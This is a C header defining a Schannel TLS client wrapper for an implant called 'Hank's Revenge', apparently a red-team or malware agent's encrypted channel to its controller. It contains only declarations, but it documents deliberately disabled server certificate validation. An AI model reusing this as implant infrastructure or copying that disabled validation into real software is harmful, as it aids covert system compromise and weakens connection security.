#pragma once

/*
 * tls.h - Schannel TLS client context for the Hank's Revenge implant.
 *
 * Provides a thin wrapper around the Windows Schannel SSPI that performs the
 * TLS client handshake, encrypts outbound data, and decrypts inbound data.
 * All implant network I/O routes through this layer so that tasking and
 * results are never sent in plaintext.
 *
 * WIN32_LEAN_AND_MEAN prevents Windows.h from pulling in the legacy
 * winsock.h (v1) so WinSock2.h can be included without conflicts.
 *
 * SECURITY_WIN32 must be defined before Security.h / sspi.h so that the
 * Win32 user-mode SSPI declarations (CredHandle, CtxHandle, etc.) are
 * emitted rather than the kernel-mode stubs.  It is also set globally via
 * CMake add_definitions() so it is always defined regardless of include
 * order; the #ifndef guard here makes tls.h self-sufficient when included
 * in isolation.
 */

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#ifndef SECURITY_WIN32
#define SECURITY_WIN32
#endif

/* WinSock2.h must come before Windows.h to avoid the winsock1 conflict. */
#include <WinSock2.h>
#include <Windows.h>

/* Security.h is the umbrella; sspi.h is included explicitly as well so
 * that CredHandle / CtxHandle / SecPkgContext_StreamSizes are available
 * even on SDK versions where the Security.h → sspi.h chain differs. */
#include <Security.h>
#include <sspi.h>
#include <Schannel.h>

#include "debug.h"

/* Raw ciphertext staging buffer; large enough for one maximum-size TLS record
 * plus the next record's header so Schannel always has something to work with. */
#define TLS_RAW_BUFFER_SIZE 32768

/* SP_PROT_TLS1_3_CLIENT was introduced in SDK 10.0.17763. Define a fallback
 * value so the code compiles against older toolchains. */
#ifndef SP_PROT_TLS1_3_CLIENT
#define SP_PROT_TLS1_3_CLIENT 0x00002000
#endif

/*
 * Note: SCH_CREDENTIALS and TLS_PARAMETERS are defined privately inside
 * tls.c using unique HANK_* names that are independent of SDK version.
 * Do NOT attempt to use SCH_CREDENTIALS here — SCH_CREDENTIALS_VERSION is
 * defined unconditionally by <Schannel.h> even when the struct itself is
 * absent (it is gated on NTDDI_WIN10_RS5 which varies across SDK builds).
 */

/**
 * @brief Per-connection TLS state for one poll cycle.
 *
 * Zero-initialize this structure before calling TlsInit. All fields are
 * managed internally; callers should treat the struct as opaque except to
 * pass it by pointer to the TLS API functions.
 */
typedef struct _TLS_CONTEXT
{
    SOCKET                      sock;               /* Underlying TCP socket   */
    SecHandle                   credHandle;         /* Schannel credentials    */
    SecHandle                   ctxHandle;          /* Established TLS session */
    BOOL                        credAcquired;       /* credHandle is valid      */
    BOOL                        ctxInitialized;     /* ctxHandle is valid       */
    SecPkgContext_StreamSizes   streamSizes;        /* TLS record size limits  */

    /* Accumulated ciphertext received from the network, not yet decrypted. */
    BYTE                        rawBuf[TLS_RAW_BUFFER_SIZE];
    DWORD                       rawLen;

    /* Decrypted plaintext waiting to be consumed by TlsRecvAll callers.
     * Heap-allocated; freed when plainOff reaches plainLen. */
    PBYTE                       plainBuf;
    DWORD                       plainLen;
    DWORD                       plainOff;
} TLS_CONTEXT;

/**
 * @brief Performs the TLS client handshake on an already-connected TCP socket.
 *
 * Server certificate validation is intentionally disabled via
 * SCH_CRED_MANUAL_CRED_VALIDATION so that a self-signed lab certificate is
 * accepted without embedding the CA cert in the implant.
 *
 * @param sock       A connected TCP socket (from connect(2)).
 * @param serverName Wide-character server name used for SNI in the handshake.
 * @param ctx        Output context; must be zeroed by the caller before use.
 *
 * @return TRUE on success, FALSE if any handshake step fails.
 */
BOOL TlsInit(SOCKET sock, PCWSTR serverName, TLS_CONTEXT* ctx);

/**
 * @brief Encrypts and sends exactly len bytes through the TLS channel.
 *
 * Large writes are split into cbMaximumMessage-sized chunks automatically.
 *
 * @param ctx The active TLS context.
 * @param buf The plaintext buffer to transmit.
 * @param len Number of bytes to send.
 *
 * @return TRUE on success, FALSE if encryption or the underlying send fails.
 */
BOOL TlsSendAll(TLS_CONTEXT* ctx, CONST BYTE* buf, DWORD len);

/**
 * @brief Receives and decrypts exactly len bytes from the TLS channel.
 *
 * Internally receives whole TLS records and buffers surplus plaintext for
 * subsequent calls, so callers may request any number of bytes per call.
 *
 * @param ctx The active TLS context.
 * @param buf Output buffer to fill with decrypted data.
 * @param len Exact number of bytes to return.
 *
 * @return TRUE on success, FALSE if decryption or the underlying recv fails.
 */
BOOL TlsRecvAll(TLS_CONTEXT* ctx, BYTE* buf, DWORD len);

/**
 * @brief Sends a TLS close_notify alert and closes the underlying socket.
 *
 * Safe to call on a partially-initialized context; checks each field before
 * attempting to release it.
 *
 * @param ctx The TLS context to shut down.
 */
VOID TlsCleanup(TLS_CONTEXT* ctx);
